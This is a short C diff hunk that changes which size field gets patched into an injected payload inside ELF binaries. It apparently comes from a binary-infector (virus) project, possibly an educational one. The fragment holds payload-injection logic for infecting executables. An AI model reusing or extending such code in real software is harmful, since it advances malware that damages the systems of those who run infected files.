@@ -116,13 +116,13 @@ void overwrite_payload_gettextsize(t_famine *famine)
     {
         gettextsize_offset = find_gettextsize_offset_elf32(famine);
         // Rewrite gettextsize_offset + 2 to skip two first instructions and go to textsize value.
-        memcpy(famine->payload_data + gettextsize_offset + 2, (void *)&(famine->text_section_size), 4);
+        memcpy(famine->payload_data + gettextsize_offset + 2, (void *)&(famine->text_p_size), 4);
     }
     else if (ARCH_64)
     {
         gettextsize_offset = find_gettextsize_offset_elf64(famine);
         // Rewrite gettextsize_offset + 2 to skip two first instructions and go to textsize value.
-        memcpy(famine->payload_data + gettextsize_offset + 2, (void *)&(famine->text_section_size), 4);
+        memcpy(famine->payload_data + gettextsize_offset + 2, (void *)&(famine->text_p_size), 4);
     }
 }
 
